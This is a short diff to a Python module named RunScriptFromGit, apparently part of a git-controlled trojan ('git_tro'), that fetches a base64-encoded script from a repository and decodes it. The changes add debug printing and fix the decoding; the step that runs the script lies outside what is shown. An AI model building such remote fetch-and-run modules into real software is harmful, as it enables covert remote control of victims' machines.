@@ -35,10 +35,11 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	print("[*] In RunScriptFromGit module.")
 	os.system("echo '[*] In RunScriptFromGit module.'>> .Tlog.log") #Todelete
 	script	= get_file_contents(scriptPath)
+	print(script)
 	#content = None
 	if script is not None:
-		content	= str(base64.b64decode(script))   #.decode("utf-8")
-		#print(content)
+		content	= base64.b64decode(script).decode()
+		print(content)
 		#try:
 		#	os.makedirs("scripts", mode=777)
 		#except:
